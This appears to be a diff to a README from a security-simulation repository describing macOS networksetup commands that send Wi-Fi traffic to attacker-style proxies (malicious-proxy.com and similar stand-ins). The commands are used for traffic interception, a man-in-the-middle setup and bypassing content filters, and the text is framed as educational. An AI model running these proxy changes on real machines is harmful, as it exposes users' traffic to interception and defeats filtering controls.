@@ -1,6 +1,6 @@
 ## simulate malicious content injection through the manipulation of proxy settings 
 
-This repository provides examples of Threat Tactics and Procedures (TTPs) using macOS networksetup commands to simulate malicious content injection through the manipulation of proxy settings. These techniques illustrate how threat actors could potentially exploit vulnerabilities or misconfigurations in network setups.
+examples of (TTPs) using macOS networksetup commands to simulate malicious content injection through the manipulation of proxy settings. These techniques illustrate how threat actors could potentially exploit vulnerabilities or misconfigurations in network setups.
 
 Prerequisites
 macOS environment
@@ -8,8 +8,6 @@ Administrative privileges on the target machine
 Educational purposes only; unauthorized use is strictly prohibited
 Examples
 1. Traffic Interception
-```bash
-Copy code
 # Set web proxy to redirect traffic
 networksetup -setwebproxy "Wi-Fi" proxy.example.com 8080
 
@@ -18,8 +16,6 @@ networksetup -setproxybypassdomains "Wi-Fi" "*.internal.lan" "*.local"
 In this example, a web proxy is configured to redirect Wi-Fi traffic through proxy.example.com on port 8080. The *.internal.lan and *.local domains are exempted from proxying.
 
 2. Man-in-the-Middle (MitM) Attack
-```bash
-Copy code
 # Set web proxy to control communication
 networksetup -setwebproxy "Wi-Fi" malicious-proxy.com 8888
 
@@ -28,8 +24,6 @@ networksetup -setwebproxy "Wi-Fi" malicious-proxy.com 8888
 This example configures a web proxy to malicious-proxy.com on port 8888, enabling an attacker to capture and manipulate communication between the target machine and web servers.
 
 3. Bypassing Content Filters
-```bash
-Copy code
 # Set web proxy to bypass content filters
 networksetup -setwebproxy "Wi-Fi" bypass-proxy.com 8080
 
@@ -38,4 +32,4 @@ networksetup -setproxybypassdomains "Wi-Fi" "restricted-site1.com" "restricted-s
 Here, a web proxy is set to bypass-proxy.com on port 8080, and specific domains are exempted from proxying to circumvent content filters.
 
 Disclaimer
-This repository is intended for educational purposes only. Unauthorized use or exploitation of these techniques is strictly prohibited and may violate the law. Always ensure proper authorization before performing any security testing or ethical hacking activities.
+This is intended for educational purposes only. Unauthorized use or exploitation of these techniques is strictly prohibited and may violate the law. Always ensure proper authorization before performing any security testing or ethical hacking activities.
